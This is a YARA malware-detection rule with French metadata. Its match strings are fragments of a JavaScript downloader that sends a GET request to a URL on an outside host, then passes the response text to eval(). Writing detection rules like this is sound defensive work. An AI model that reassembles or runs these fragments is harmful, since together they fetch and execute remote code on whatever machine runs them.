rule MULTI_Sample_Unique_05913ee2
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (inconnu, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "05913ee2a25cc2de7dc10ed47f6d74b4773d722c021d94b4aa6734243401dfdc"
        yarahub_uuid = "1117519f-fa4c-433c-b4d8-fbb4f47ba1ad"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "inconnu"
        etat = "binaire"
        confidence_suggeree = "low"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "23f7818ecac6ab1e9f081c4da4cc2c9c"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "var polypean = \"http://johnsonsvalves.cam/V6n3LqhK\";" wide ascii
        $s1 = "fumidity.open(\"GET\", polypean, false);" wide ascii
        $s2 = "fumidity.send();" wide ascii
        $s3 = "var flesinoxan = fumidity.responseText;" wide ascii
        $s4 = "eval(flesinoxan);" wide ascii
    condition:
        true and filesize < 50MB and 3 of ($s1, $s2, $s3, $s4) and 1 of ($s0)
}
